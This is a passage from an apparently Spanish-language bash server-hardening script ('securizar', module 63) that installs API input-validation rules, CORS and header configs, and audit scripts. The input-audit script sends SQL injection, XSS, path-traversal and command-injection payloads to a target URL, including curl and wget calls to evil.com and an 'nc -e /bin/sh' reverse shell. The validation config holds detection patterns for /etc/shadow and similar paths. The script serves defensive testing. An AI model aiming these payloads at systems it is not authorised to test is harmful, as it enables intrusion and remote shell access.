        if grep -qoE 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*' "$file" 2>/dev/null; then
            warn "Token JWT hardcodeado encontrado en: $file"
            ((found++)) || true
        fi
    done < <(find "$scan_dir" -type f \( -name "*.conf" -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" -o -name "*.env" -o -name "*.properties" -o -name "*.toml" -o -name "*.ini" -o -name "*.cfg" \) -print0 2>/dev/null)

    if [[ $found -eq 0 ]]; then
        pass "Sin problemas JWT detectados en $scan_dir"
    else
        echo -e "  ${RED}Total: $found problema(s) encontrado(s)${NC}"
    fi
}

# ── Escanear configuraciones de aplicaciones comunes ─────────
scan_common_configs() {
    echo -e "${CYAN}── Escaneando configuraciones comunes ──${NC}"

    local config_dirs=(
        "/etc/nginx"
        "/etc/apache2"
        "/etc/httpd"
        "/etc/haproxy"
        "/opt"
        "/srv"
    )

    for dir in "${config_dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            scan_directory "$dir"
        fi
    done
}

# ── Main ─────────────────────────────────────────────────────
case "${1:-}" in
    --token)
        if [[ -z "${2:-}" ]]; then
            echo "Uso: $0 --token TOKEN_JWT"
            exit 1
        fi
        analyze_token "$2"
        ;;
    --config)
        scan_directory "${2:-.}"
        ;;
    --scan)
        scan_directory "${2:-/etc}"
        ;;
    *)
        scan_common_configs
        ;;
esac

echo ""
echo -e "${BOLD}── Resumen ──${NC}"
echo -e "  ${GREEN}Pasados: $PASSED${NC}"
echo -e "  ${YELLOW}Avisos:  $WARNINGS${NC}"
echo -e "  ${RED}Fallos:  $ISSUES${NC}"

if [[ $ISSUES -gt 0 ]]; then
    echo -e "\n${RED}Se encontraron $ISSUES problemas criticos${NC}"
    exit 1
elif [[ $WARNINGS -gt 0 ]]; then
    echo -e "\n${YELLOW}Se encontraron $WARNINGS avisos${NC}"
    exit 0
else
    echo -e "\n${GREEN}Sin problemas detectados${NC}"
    exit 0
fi
EOFJWTAUDIT
    chmod +x "$JWT_AUDIT"
    log_change "Creado" "$JWT_AUDIT"
    log_change "Permisos" "$JWT_AUDIT -> +x"

    log_info "Hardening de autenticacion API configurado"
    log_info "Ejecuta: auditar-jwt.sh --token TOKEN_JWT"
else
    log_skip "API authentication hardening"
fi

# ============================================================
# S3: INPUT VALIDATION Y SCHEMA ENFORCEMENT
# ============================================================
log_section "S3: Input validation y schema enforcement"

log_info "Configura validacion de entrada para APIs:"
log_info "  - Reglas de validacion de input"
log_info "  - Script de auditoria de endpoints"
log_info "  - Template OpenAPI/Swagger"
log_info "  - Limites de tamano y content-type"
echo ""

if check_file_exists /etc/securizar/api-input-validation.conf; then
    log_already "Input validation y schema enforcement (api-input-validation.conf existe)"
elif ask "¿Configurar input validation y schema enforcement?"; then

    # ── Configuracion de validacion ──────────────────────────
    VALIDATION_CONF="/etc/securizar/api-input-validation.conf"
    if [[ -f "$VALIDATION_CONF" ]]; then
        cp -a "$VALIDATION_CONF" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$VALIDATION_CONF" << 'EOF'
# ============================================================
# api-input-validation.conf - Reglas de validacion de entrada
# Generado por securizar - Modulo 63
# ============================================================

# ── Tamanos maximos ──────────────────────────────────────────
MAX_REQUEST_BODY_BYTES=10485760
MAX_JSON_DEPTH=10
MAX_JSON_KEYS=100
MAX_STRING_LENGTH=10000
MAX_ARRAY_LENGTH=1000
MAX_URL_LENGTH=2048
MAX_HEADER_SIZE=8192
MAX_QUERY_PARAMS=50

# ── Content-Types permitidos ─────────────────────────────────
ALLOWED_CONTENT_TYPES="application/json,application/xml,multipart/form-data,application/x-www-form-urlencoded"
REQUIRE_CONTENT_TYPE=true
STRICT_CONTENT_TYPE=true

# ── Patrones peligrosos (SQL injection) ──────────────────────
SQL_INJECTION_PATTERNS="' OR|' AND|UNION SELECT|DROP TABLE|INSERT INTO|DELETE FROM|UPDATE.*SET|EXEC\(|xp_|sp_|0x[0-9a-fA-F]|WAITFOR DELAY|BENCHMARK\(|SLEEP\("

# ── Patrones peligrosos (Command injection) ──────────────────
CMD_INJECTION_PATTERNS=";\s*\w|&&\s*\w|\|\|\s*\w|\$\(|`.*`|\.\./|/etc/passwd|/etc/shadow|/proc/self"

# ── Patrones peligrosos (XSS) ───────────────────────────────
XSS_PATTERNS="<script|javascript:|on\w+\s*=|<iframe|<object|<embed|<svg.*onload|data:text/html"

# ── Patrones peligrosos (Path traversal) ─────────────────────
PATH_TRAVERSAL_PATTERNS="\.\./|\.\.\\\\|%2e%2e|%252e%252e|%c0%ae|%c1%9c"

# ── Validacion de parametros ─────────────────────────────────
REQUIRE_SCHEMA_VALIDATION=true
REJECT_UNKNOWN_FIELDS=true
SANITIZE_HTML=true
ENCODE_OUTPUT=true
EOF
    log_change "Creado" "$VALIDATION_CONF"

    # ── Script de auditoria de input ─────────────────────────
    INPUT_AUDIT="/usr/local/bin/auditar-api-input.sh"
    if [[ -f "$INPUT_AUDIT" ]]; then
        cp -a "$INPUT_AUDIT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$INPUT_AUDIT" << 'EOFINPUTAUDIT'
#!/bin/bash
# ============================================================
# auditar-api-input.sh - Auditoria de validacion de entrada API
# Generado por securizar - Modulo 63
# ============================================================
# Uso: auditar-api-input.sh URL [--sqli] [--cmdi] [--xss] [--all]
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

URL="${1:-}"
TEST_TYPE="${2:---all}"
ISSUES=0
PASSED=0
WARNINGS=0

if [[ -z "$URL" ]]; then
    echo "Uso: $0 URL [--sqli|--cmdi|--xss|--traversal|--size|--content-type|--all]"
    exit 1
fi

if ! command -v curl &>/dev/null; then
    echo -e "${RED}Error: curl es necesario${NC}"
    exit 1
fi

echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "${BOLD}  AUDITORIA DE INPUT VALIDATION${NC}"
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "  Target: ${URL}"
echo ""

pass() { echo -e "  ${GREEN}[PASS]${NC} $1"; ((PASSED++)) || true; }
warn() { echo -e "  ${YELLOW}[WARN]${NC} $1"; ((WARNINGS++)) || true; }
fail() { echo -e "  ${RED}[FAIL]${NC} $1"; ((ISSUES++)) || true; }

# ── Test SQL Injection ───────────────────────────────────────
test_sqli() {
    echo -e "${CYAN}── SQL Injection Tests ──${NC}"
    local payloads=(
        "' OR '1'='1"
        "1; DROP TABLE users--"
        "' UNION SELECT NULL,NULL--"
        "1' AND 1=1--"
        "admin'--"
        "1 WAITFOR DELAY '0:0:5'--"
        "1' OR SLEEP(5)--"
        "'; EXEC xp_cmdshell('whoami')--"
    )

    for payload in "${payloads[@]}"; do
        local encoded
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${URL}?id=${encoded}" 2>/dev/null || echo "000")
        local status_body
        status_body=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST -H "Content-Type: application/json" -d "{\"input\":\"$payload\"}" "${URL}" 2>/dev/null || echo "000")

        if [[ "$status" == "200" || "$status_body" == "200" ]]; then
            fail "SQLi payload aceptado (HTTP 200): ${payload:0:40}"
        elif [[ "$status" == "500" || "$status_body" == "500" ]]; then
            warn "SQLi payload causa error 500: ${payload:0:40}"
        elif [[ "$status" == "400" || "$status" == "403" || "$status" == "422" ]]; then
            pass "SQLi payload rechazado (HTTP $status): ${payload:0:40}"
        else
            pass "SQLi payload: HTTP $status / $status_body"
        fi
    done
}

# ── Test Command Injection ───────────────────────────────────
test_cmdi() {
    echo -e "${CYAN}── Command Injection Tests ──${NC}"
    local payloads=(
        "; ls -la"
        "| cat /etc/passwd"
        "\$(whoami)"
        "\`id\`"
        "&& curl http://evil.com"
        "|| wget http://evil.com"
        "; nc -e /bin/sh attacker 4444"
    )

    for payload in "${payloads[@]}"; do
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST -H "Content-Type: application/json" -d "{\"cmd\":\"$payload\"}" "${URL}" 2>/dev/null || echo "000")

        if [[ "$status" == "200" ]]; then
            fail "CMDi payload aceptado (HTTP 200): ${payload:0:40}"
        elif [[ "$status" == "500" ]]; then
            warn "CMDi payload causa error 500: ${payload:0:40}"
        elif [[ "$status" == "400" || "$status" == "403" || "$status" == "422" ]]; then
            pass "CMDi payload rechazado (HTTP $status): ${payload:0:40}"
        else
            pass "CMDi: HTTP $status"
        fi
    done
}

# ── Test XSS ─────────────────────────────────────────────────
test_xss() {
    echo -e "${CYAN}── XSS Tests ──${NC}"
    local payloads=(
        "<script>alert(1)</script>"
        "<img src=x onerror=alert(1)>"
        "javascript:alert(1)"
        "<svg onload=alert(1)>"
        "<iframe src='javascript:alert(1)'>"
        "'\"><script>alert(1)</script>"
    )

    for payload in "${payloads[@]}"; do
        local response
        response=$(curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d "{\"input\":\"$payload\"}" "${URL}" 2>/dev/null || echo "")

        if echo "$response" | grep -qi "<script>" 2>/dev/null; then
            fail "XSS payload reflejado en respuesta: ${payload:0:40}"
        else
            pass "XSS payload no reflejado: ${payload:0:40}"
        fi
    done
}

# ── Test Path Traversal ──────────────────────────────────────
test_traversal() {
    echo -e "${CYAN}── Path Traversal Tests ──${NC}"
    local payloads=(
        "../../etc/passwd"
        "..%2f..%2fetc%2fpasswd"
        "....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..\\..\\windows\\system32\\config\\sam"
    )

    for payload in "${payloads[@]}"; do
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${URL}/${payload}" 2>/dev/null || echo "000")

        if [[ "$status" == "200" ]]; then
            fail "Path traversal aceptado (HTTP 200): ${payload:0:40}"
        elif [[ "$status" == "400" || "$status" == "403" ]]; then
            pass "Path traversal rechazado (HTTP $status): ${payload:0:40}"
        else
            pass "Path traversal: HTTP $status"
        fi
    done
}

# ── Test Content-Type enforcement ────────────────────────────
test_content_type() {
    echo -e "${CYAN}── Content-Type Enforcement Tests ──${NC}"

    # Sin Content-Type
    local status
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST -d '{"test":1}' "${URL}" 2>/dev/null || echo "000")
    if [[ "$status" == "200" ]]; then
        warn "Acepta POST sin Content-Type header"
    else
        pass "Rechaza POST sin Content-Type (HTTP $status)"
    fi

    # Content-Type incorrecto
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST -H "Content-Type: text/plain" -d '{"test":1}' "${URL}" 2>/dev/null || echo "000")
    if [[ "$status" == "200" ]]; then
        warn "Acepta Content-Type: text/plain para JSON endpoint"
    else
        pass "Rechaza Content-Type incorrecto (HTTP $status)"
    fi
}

# ── Test Request Size Limits ─────────────────────────────────
test_size_limits() {
    echo -e "${CYAN}── Request Size Limit Tests ──${NC}"

    # Generar payload grande (1MB)
    local large_payload
    large_payload=$(python3 -c "print('{\"data\":\"' + 'A'*1048576 + '\"}')" 2>/dev/null || true)
    if [[ -n "$large_payload" ]]; then
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 -X POST -H "Content-Type: application/json" -d "$large_payload" "${URL}" 2>/dev/null || echo "000")
        if [[ "$status" == "413" || "$status" == "400" ]]; then
            pass "Request grande rechazado (HTTP $status, ~1MB)"
        elif [[ "$status" == "200" ]]; then
            warn "Acepta requests de ~1MB sin limite"
        else
            pass "Request grande: HTTP $status"
        fi
    else
        warn "No se pudo generar payload de test (python3 necesario)"
    fi

    # URL muy larga
    local long_param
    long_param=$(printf 'A%.0s' $(seq 1 5000))
    local status
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${URL}?q=${long_param}" 2>/dev/null || echo "000")
    if [[ "$status" == "414" || "$status" == "400" ]]; then
        pass "URL larga rechazada (HTTP $status)"
    elif [[ "$status" == "200" ]]; then
        warn "Acepta URLs de >5000 chars sin limite"
    else
        pass "URL larga: HTTP $status"
    fi
}

# ── Ejecutar tests ───────────────────────────────────────────
case "$TEST_TYPE" in
    --sqli)         test_sqli ;;
    --cmdi)         test_cmdi ;;
    --xss)          test_xss ;;
    --traversal)    test_traversal ;;
    --content-type) test_content_type ;;
    --size)         test_size_limits ;;
    --all)
        test_sqli
        echo ""
        test_cmdi
        echo ""
        test_xss
        echo ""
        test_traversal
        echo ""
        test_content_type
        echo ""
        test_size_limits
        ;;
    *) echo "Tipo no valido: $TEST_TYPE"; exit 1 ;;
esac

echo ""
echo -e "${BOLD}── Resumen ──${NC}"
echo -e "  ${GREEN}Pasados:  $PASSED${NC}"
echo -e "  ${YELLOW}Avisos:   $WARNINGS${NC}"
echo -e "  ${RED}Fallos:   $ISSUES${NC}"

[[ $ISSUES -gt 0 ]] && exit 1 || exit 0
EOFINPUTAUDIT
    chmod +x "$INPUT_AUDIT"
    log_change "Creado" "$INPUT_AUDIT"
    log_change "Permisos" "$INPUT_AUDIT -> +x"

    # ── Template OpenAPI schema ──────────────────────────────
    OPENAPI_TEMPLATE="/etc/securizar/openapi-security-template.yaml"
    if [[ -f "$OPENAPI_TEMPLATE" ]]; then
        cp -a "$OPENAPI_TEMPLATE" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$OPENAPI_TEMPLATE" << 'EOF'
# ============================================================
# openapi-security-template.yaml - Template de seguridad OpenAPI
# Generado por securizar - Modulo 63
# ============================================================
# Usar como base para definir esquemas de validacion
# ============================================================
openapi: "3.0.3"
info:
  title: "API Security Template"
  version: "1.0.0"
  description: "Template con mejores practicas de seguridad"

# ── Seguridad global ─────────────────────────────────────────
security:
  - BearerAuth: []
  - ApiKeyAuth: []

components:
  securitySchemes:
    BearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT
    ApiKeyAuth:
      type: apiKey
      in: header
      name: X-API-Key
    OAuth2:
      type: oauth2
      flows:
        authorizationCode:
          authorizationUrl: /oauth2/authorize
          tokenUrl: /oauth2/token
          scopes:
            read: Read access
            write: Write access
            admin: Admin access

  # ── Schemas con validacion estricta ────────────────────────
  schemas:
    Error:
      type: object
      required: [error, message]
      properties:
        error:
          type: string
          maxLength: 100
        message:
          type: string
          maxLength: 500
        details:
          type: array
          maxItems: 10
          items:
            type: string
            maxLength: 200

    PaginationParams:
      type: object
      properties:
        page:
          type: integer
          minimum: 1
          maximum: 10000
          default: 1
        per_page:
          type: integer
          minimum: 1
          maximum: 100
          default: 20

    # Input sanitization example
    UserInput:
      type: object
      required: [name, email]
      additionalProperties: false
      properties:
        name:
          type: string
          minLength: 1
          maxLength: 100
          pattern: "^[a-zA-Z0-9\\s\\-\\.]+$"
        email:
          type: string
          format: email
          maxLength: 254
        description:
          type: string
          maxLength: 1000

  # ── Respuestas comunes ─────────────────────────────────────
  responses:
    BadRequest:
      description: "Invalid input"
      content:
        application/json:
          schema:
            $ref: '#/components/schemas/Error'
    Unauthorized:
      description: "Authentication required"
    Forbidden:
      description: "Insufficient permissions"
    NotFound:
      description: "Resource not found"
    RateLimited:
      description: "Rate limit exceeded"
      headers:
        Retry-After:
          schema:
            type: integer
        X-RateLimit-Limit:
          schema:
            type: integer
        X-RateLimit-Remaining:
          schema:
            type: integer

# ── Paths ejemplo ────────────────────────────────────────────
paths:
  /api/resource:
    get:
      summary: "List resources"
      security:
        - BearerAuth: []
      parameters:
        - name: page
          in: query
          schema:
            type: integer
            minimum: 1
            maximum: 10000
        - name: per_page
          in: query
          schema:
            type: integer
            minimum: 1
            maximum: 100
      responses:
        '200':
          description: "Success"
        '401':
          $ref: '#/components/responses/Unauthorized'
        '429':
          $ref: '#/components/responses/RateLimited'

    post:
      summary: "Create resource"
      security:
        - BearerAuth: []
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/UserInput'
      responses:
        '201':
          description: "Created"
        '400':
          $ref: '#/components/responses/BadRequest'
        '401':
          $ref: '#/components/responses/Unauthorized'
        '429':
          $ref: '#/components/responses/RateLimited'
EOF
    log_change "Creado" "$OPENAPI_TEMPLATE"

    log_info "Input validation configurado"
    log_info "Ejecuta: auditar-api-input.sh URL --all"
else
    log_skip "Input validation y schema enforcement"
fi

# ============================================================
# S4: CORS Y SECURITY HEADERS
# ============================================================
log_section "S4: CORS y security headers"

log_info "Configura politicas CORS y cabeceras de seguridad para APIs:"
log_info "  - Restrict Access-Control-Allow-Origin"
log_info "  - Limitar metodos y cabeceras permitidos"
log_info "  - Content-Security-Policy para respuestas API"
log_info "  - X-Content-Type-Options, X-Frame-Options, HSTS"
log_info "  - Script de auditoria de cabeceras"
echo ""

if check_file_exists /usr/local/bin/auditar-headers-api.sh; then
    log_already "CORS y security headers (auditar-headers-api.sh existe)"
elif ask "¿Configurar CORS y security headers para APIs?"; then

    # ── Nginx CORS y headers ─────────────────────────────────
    if [[ "$NGINX_INSTALLED" == true ]]; then
        mkdir -p "$NGINX_CONF_DIR/snippets"

        CORS_CONF="$NGINX_CONF_DIR/snippets/securizar-api-cors.conf"
        if [[ -f "$CORS_CONF" ]]; then
            cp -a "$CORS_CONF" "$BACKUP_DIR/" 2>/dev/null || true
        fi

        cat > "$CORS_CONF" << 'EOF'
# ============================================================
# securizar-api-cors.conf - CORS y security headers para APIs
# Generado por securizar - Modulo 63
# Incluir dentro de bloques location para API endpoints
# ============================================================

# ── CORS Headers ─────────────────────────────────────────────
# IMPORTANTE: Cambiar 'https://yourdomain.com' por tu dominio real
# NO usar '*' en produccion con credenciales

# Manejar preflight OPTIONS
if ($request_method = 'OPTIONS') {
    add_header 'Access-Control-Allow-Origin' 'https://yourdomain.com' always;
    add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, PATCH, DELETE, OPTIONS' always;
    add_header 'Access-Control-Allow-Headers' 'Authorization, Content-Type, X-API-Key, X-Request-ID' always;
    add_header 'Access-Control-Max-Age' '86400' always;
    add_header 'Access-Control-Allow-Credentials' 'true' always;
    add_header 'Content-Type' 'text/plain charset=UTF-8';
    add_header 'Content-Length' '0';
    return 204;
}

# CORS para respuestas normales
add_header 'Access-Control-Allow-Origin' 'https://yourdomain.com' always;
add_header 'Access-Control-Allow-Credentials' 'true' always;
add_header 'Access-Control-Expose-Headers' 'X-Request-ID, X-RateLimit-Limit, X-RateLimit-Remaining, Retry-After' always;

# ── Security Headers ─────────────────────────────────────────
add_header 'X-Content-Type-Options' 'nosniff' always;
add_header 'X-Frame-Options' 'DENY' always;
add_header 'X-XSS-Protection' '0' always;
add_header 'Referrer-Policy' 'strict-origin-when-cross-origin' always;
add_header 'Strict-Transport-Security' 'max-age=31536000; includeSubDomains; preload' always;
add_header 'Content-Security-Policy' "default-src 'none'; frame-ancestors 'none'" always;
add_header 'Permissions-Policy' 'camera=(), microphone=(), geolocation=(), interest-cohort=()' always;
add_header 'Cache-Control' 'no-store, no-cache, must-revalidate' always;
add_header 'Pragma' 'no-cache' always;

# ── API Version Header ───────────────────────────────────────
add_header 'X-API-Version' '1.0' always;

# ── Request ID tracking ─────────────────────────────────────
add_header 'X-Request-ID' $request_id always;
EOF
        log_change "Creado" "$CORS_CONF"
    fi

    # ── Apache CORS y headers ────────────────────────────────
    if [[ "$APACHE_INSTALLED" == true ]]; then
        if [[ "$DISTRO_FAMILY" == "debian" ]]; then
            APACHE_CORS_CONF="$APACHE_CONF_DIR/conf-available/securizar-api-cors.conf"
        else
            mkdir -p "$APACHE_CONF_DIR/conf.d"
            APACHE_CORS_CONF="$APACHE_CONF_DIR/conf.d/securizar-api-cors.conf"
        fi

        if [[ -f "$APACHE_CORS_CONF" ]]; then
            cp -a "$APACHE_CORS_CONF" "$BACKUP_DIR/" 2>/dev/null || true
        fi

        cat > "$APACHE_CORS_CONF" << 'EOF'
# ============================================================
# securizar-api-cors.conf - CORS y security headers (Apache)
# Generado por securizar - Modulo 63
# ============================================================

<IfModule mod_headers.c>
    # ── CORS ─────────────────────────────────────────────────
    # Cambiar 'https://yourdomain.com' por tu dominio real
    <Location /api/>
        Header always set Access-Control-Allow-Origin "https://yourdomain.com"
        Header always set Access-Control-Allow-Methods "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        Header always set Access-Control-Allow-Headers "Authorization, Content-Type, X-API-Key, X-Request-ID"
        Header always set Access-Control-Max-Age "86400"
        Header always set Access-Control-Allow-Credentials "true"
        Header always set Access-Control-Expose-Headers "X-Request-ID, X-RateLimit-Limit, X-RateLimit-Remaining"
    </Location>

    # ── Security Headers ─────────────────────────────────────
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "DENY"
    Header always set X-XSS-Protection "0"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    Header always set Content-Security-Policy "default-src 'none'; frame-ancestors 'none'"
    Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(), interest-cohort=()"
    Header always set Cache-Control "no-store, no-cache, must-revalidate"
    Header always set Pragma "no-cache"
    Header always set X-API-Version "1.0"

    # ── Eliminar headers informativos ────────────────────────
    Header always unset X-Powered-By
    Header always unset Server
</IfModule>

# ── Manejar preflight OPTIONS ────────────────────────────────
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_METHOD} OPTIONS
    RewriteRule ^/api/ - [R=204,L]
</IfModule>
EOF
        log_change "Creado" "$APACHE_CORS_CONF"

        if [[ "$DISTRO_FAMILY" == "debian" ]]; then
            a2enmod headers 2>/dev/null || true
            a2enmod rewrite 2>/dev/null || true
            a2enconf securizar-api-cors 2>/dev/null || true
        fi
    fi

    # ── Script de auditoria de headers ───────────────────────
    HEADERS_AUDIT="/usr/local/bin/auditar-headers-api.sh"
    if [[ -f "$HEADERS_AUDIT" ]]; then
        cp -a "$HEADERS_AUDIT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$HEADERS_AUDIT" << 'EOFHEADERSAUDIT'
#!/bin/bash
# ============================================================
# auditar-headers-api.sh - Auditoria de cabeceras de seguridad API
# Generado por securizar - Modulo 63
# ============================================================
# Uso: auditar-headers-api.sh URL [--cors] [--security] [--all]
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

URL="${1:-}"
CHECK_TYPE="${2:---all}"
ISSUES=0; PASSED=0; WARNINGS=0

if [[ -z "$URL" ]]; then
    echo "Uso: $0 URL [--cors|--security|--all]"
    exit 1
fi

if ! command -v curl &>/dev/null; then
    echo -e "${RED}Error: curl necesario${NC}"
    exit 1
fi

echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "${BOLD}  AUDITORIA DE HEADERS API${NC}"
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "  Target: ${URL}"
echo ""

pass() { echo -e "  ${GREEN}[PASS]${NC} $1"; ((PASSED++)) || true; }
warn() { echo -e "  ${YELLOW}[WARN]${NC} $1"; ((WARNINGS++)) || true; }
fail() { echo -e "  ${RED}[FAIL]${NC} $1"; ((ISSUES++)) || true; }

# Obtener headers
HEADERS=$(curl -sI --max-time 10 "$URL" 2>/dev/null || echo "")
if [[ -z "$HEADERS" ]]; then
    echo -e "${RED}No se pudo conectar a $URL${NC}"
    exit 1
fi

echo -e "${DIM}Headers recibidos:${NC}"
echo "$HEADERS" | head -20
echo ""

# ── Funcion para verificar header ────────────────────────────
check_header() {
    local header_name="$1"
    local expected_value="${2:-}"
    local severity="${3:-fail}"

    local value
    value=$(echo "$HEADERS" | grep -i "^${header_name}:" | head -1 | cut -d: -f2- | sed 's/^ *//' | tr -d '\r')

    if [[ -z "$value" ]]; then
        if [[ "$severity" == "fail" ]]; then
            fail "Falta header: $header_name"
        else
            warn "Falta header: $header_name"
        fi
        return 1
    fi

    if [[ -n "$expected_value" ]]; then
        if echo "$value" | grep -qi "$expected_value" 2>/dev/null; then
            pass "$header_name: $value"
        else
            warn "$header_name presente pero valor inesperado: $value (esperado: $expected_value)"
        fi
    else
        pass "$header_name: $value"
    fi
    return 0
}

# ── Security Headers Check ───────────────────────────────────
check_security() {
    echo -e "${CYAN}── Security Headers ──${NC}"

    check_header "X-Content-Type-Options" "nosniff" "fail"
    check_header "X-Frame-Options" "DENY\|SAMEORIGIN" "fail"
    check_header "Strict-Transport-Security" "max-age" "fail"
    check_header "Content-Security-Policy" "" "warn"
    check_header "Referrer-Policy" "" "warn"
    check_header "Permissions-Policy" "" "warn"
    check_header "Cache-Control" "no-store\|no-cache" "warn"
    check_header "X-API-Version" "" "warn"

    # Headers que NO deberian estar
    echo ""
    echo -e "${CYAN}── Headers informativos (no deseados) ──${NC}"

    local server_header
    server_header=$(echo "$HEADERS" | grep -i "^Server:" | head -1 | tr -d '\r')
    if [[ -n "$server_header" ]]; then
        if echo "$server_header" | grep -qiE 'nginx/[0-9]|apache/[0-9]|IIS/[0-9]' 2>/dev/null; then
            fail "Server header expone version: $server_header"
        else
            warn "Server header presente: $server_header"
        fi
    else
        pass "Server header no expuesto"
    fi

    local powered
    powered=$(echo "$HEADERS" | grep -i "^X-Powered-By:" | head -1 | tr -d '\r')
    if [[ -n "$powered" ]]; then
        fail "X-Powered-By expuesto: $powered"
    else
        pass "X-Powered-By no expuesto"
    fi

    local aspnet
    aspnet=$(echo "$HEADERS" | grep -i "^X-AspNet-Version:" | head -1 | tr -d '\r')
    if [[ -n "$aspnet" ]]; then
        fail "X-AspNet-Version expuesto: $aspnet"
    else
        pass "X-AspNet-Version no expuesto"
    fi
}

# ── CORS Check ───────────────────────────────────────────────
check_cors() {
    echo -e "${CYAN}── CORS Headers ──${NC}"

    # Enviar preflight OPTIONS
    local cors_headers
    cors_headers=$(curl -sI --max-time 10 -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" "$URL" 2>/dev/null || echo "")

    local acao
    acao=$(echo "$cors_headers" | grep -i "^Access-Control-Allow-Origin:" | head -1 | cut -d: -f2- | sed 's/^ *//' | tr -d '\r')

    if [[ -z "$acao" ]]; then
        pass "No CORS headers en respuesta a origen desconocido"
    elif [[ "$acao" == "*" ]]; then
        fail "Access-Control-Allow-Origin: * (permite cualquier origen)"
    elif echo "$acao" | grep -qi "evil.com" 2>/dev/null; then
        fail "CORS refleja origen arbitrario: $acao"
    else
        pass "Access-Control-Allow-Origin restrictivo: $acao"
    fi

    local acac
    acac=$(echo "$cors_headers" | grep -i "^Access-Control-Allow-Credentials:" | head -1 | cut -d: -f2- | sed 's/^ *//' | tr -d '\r')
    if [[ "$acac" == "true" && "$acao" == "*" ]]; then
        fail "CORS Allow-Credentials con Allow-Origin: * (configuracion peligrosa)"
    elif [[ "$acac" == "true" ]]; then
        warn "Allow-Credentials habilitado - verificar que Allow-Origin es restrictivo"
    fi

    local acam
    acam=$(echo "$cors_headers" | grep -i "^Access-Control-Allow-Methods:" | head -1 | cut -d: -f2- | sed 's/^ *//' | tr -d '\r')
    if [[ -n "$acam" ]]; then
        pass "Allow-Methods: $acam"
        if echo "$acam" | grep -qi "TRACE\|CONNECT" 2>/dev/null; then
            warn "Metodos peligrosos en Allow-Methods: $acam"
        fi
    fi

    local acma
    acma=$(echo "$cors_headers" | grep -i "^Access-Control-Max-Age:" | head -1 | cut -d: -f2- | sed 's/^ *//' | tr -d '\r')
    if [[ -n "$acma" ]]; then
        pass "Max-Age: $acma"
    else
        warn "Sin Access-Control-Max-Age (preflight no cacheado)"
    fi
}

# ── TLS Check ────────────────────────────────────────────────
check_tls() {
    echo -e "${CYAN}── TLS Check ──${NC}"

    if [[ "$URL" != https://* ]]; then
        fail "URL no usa HTTPS"
        return
    fi

    local host
    host=$(echo "$URL" | sed 's|https://||' | cut -d/ -f1 | cut -d: -f1)
    local port
    port=$(echo "$URL" | sed 's|https://||' | cut -d/ -f1 | grep -oP ':\K[0-9]+' || echo "443")

    if command -v openssl &>/dev/null; then
        local tls_info
        tls_info=$(echo | openssl s_client -connect "${host}:${port}" -servername "$host" 2>/dev/null || echo "")

        local protocol
        protocol=$(echo "$tls_info" | grep "Protocol" | head -1 || echo "")
        if [[ -n "$protocol" ]]; then
            if echo "$protocol" | grep -q "TLSv1.3\|TLSv1.2" 2>/dev/null; then
                pass "Protocolo TLS: $protocol"
            else
                fail "Protocolo TLS debil: $protocol"
            fi
        fi

        local cipher
        cipher=$(echo "$tls_info" | grep "Cipher" | head -1 || echo "")
        if [[ -n "$cipher" ]]; then
            pass "Cipher: $cipher"
        fi
    else
        warn "openssl no disponible para verificar TLS"
    fi
}

case "$CHECK_TYPE" in
    --security) check_security ;;
    --cors)     check_cors ;;
    --tls)      check_tls ;;
    --all)
        check_security
        echo ""
        check_cors
        echo ""
        check_tls
        ;;
    *) echo "Tipo no valido: $CHECK_TYPE"; exit 1 ;;
esac

echo ""
echo -e "${BOLD}── Resumen ──${NC}"
echo -e "  ${GREEN}Pasados: $PASSED${NC}"
echo -e "  ${YELLOW}Avisos:  $WARNINGS${NC}"
echo -e "  ${RED}Fallos:  $ISSUES${NC}"

[[ $ISSUES -gt 0 ]] && exit 1 || exit 0
EOFHEADERSAUDIT
    chmod +x "$HEADERS_AUDIT"
    log_change "Creado" "$HEADERS_AUDIT"
    log_change "Permisos" "$HEADERS_AUDIT -> +x"

    log_info "CORS y security headers configurados"
    log_info "Ejecuta: auditar-headers-api.sh URL --all"
else
    log_skip "CORS y security headers"
fi

# ============================================================
# S5: API GATEWAY HARDENING (nginx/HAProxy)
# ============================================================
